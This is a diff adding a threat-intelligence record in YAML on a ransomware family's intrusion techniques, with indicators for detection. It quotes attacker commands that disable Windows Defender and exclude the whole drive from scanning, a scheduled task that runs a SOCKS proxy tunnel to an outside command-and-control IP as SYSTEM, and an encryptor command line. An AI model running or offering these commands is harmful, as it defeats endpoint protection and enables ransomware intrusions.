@@ -1,0 +1,64 @@
+title: 'The Gentlemen Ransomware: TTPs and Incident Analysis'
+description: Huntress SOC investigated two incidents involving The Gentlemen ransomware
+  (April and May 2025), revealing use of Scheduled Tasks, PowerShell-based Defender
+  tampering, SOCKS proxy C2, and log clearing as key attacker behaviors.
+attribution: The Gentlemen
+malware_families:
+- The Gentlemen ransomware
+cves:
+- CVE-2024-55591
+ttps:
+  processes:
+  - win.exe
+  - G_hlm7jj_windows_amd64.exe
+  - svchost32.exe
+  - powershell.exe
+  - cmd.exe
+  - CcmExec.exe
+  command_lines:
+  - C:\Users\REDACTED\Documents\win.exe --password REDACTED --T 200 --superfast
+  - C:\Windows\Temp\svchost32.exe client 193.233.202[.]17:44729 R:1081:socks
+  - cmd.exe /C schtasks /create /tn WindowsConnSvc /tr C:\Windows\Temp\svchost32.exe
+    client 77.110.122[.]137:37182 R:1085:socks /sc minute /mo 2 /ru SYSTEM /f > C:\Windows\Temp\RbHoNVNU.tmp
+    2>&1
+  powershell:
+  - powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true; Stop-Service
+    -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled
+  - powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true -Force
+  - powershell -Command Set-MpPreference -EnableControlledFolderAccess Disabled -Force
+  - powershell -Command Add-MpPreference -ExclusionProcess C:\Users\[REDACTED]\downloads\G_hlm7jj_windows_amd64.exe
+    -Force
+  - powershell -Command Add-MpPreference -ExclusionPath C:\ -Force
+  scripts: []
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - svchost32.exe -> 193.233.202[.]17:44729
+  - svchost32.exe -> 77.110.122[.]137:37182
+  file_activity:
+  - C:\Users\REDACTED\Documents\win.exe
+  - C:\Windows\Temp\svchost32.exe
+  - C:\Windows\Temp\RbHoNVNU.tmp
+  - README-GENTLEMEN.txt
+  persistence:
+  - Scheduled Task named WindowsConnSvc executing C:\Windows\Temp\svchost32.exe every
+    2 minutes as SYSTEM for SOCKS proxy C2 connectivity
+  - Scheduled Tasks created (likely on Domain Controller) to re-execute ransomware
+    encryptor
+  process_relations:
+  - CcmExec.exe -> win.exe
+  - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -> G_hlm7jj_windows_amd64.exe
+iocs:
+  hashes:
+  - f918535f974591ef031bd0f30a8171e3da27a6754e6426a8ba095f83195661c8
+  ip_addresses:
+  - 193.233.202[.]17
+  - 77.110.122[.]137
+  domains: []
+  urls: []
+authors:
+- Nick Roddy
+- Dani Lopez
+reference: https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps
+date_of_publication: May 22, 2026
+file_creation_date: May 22, 2026
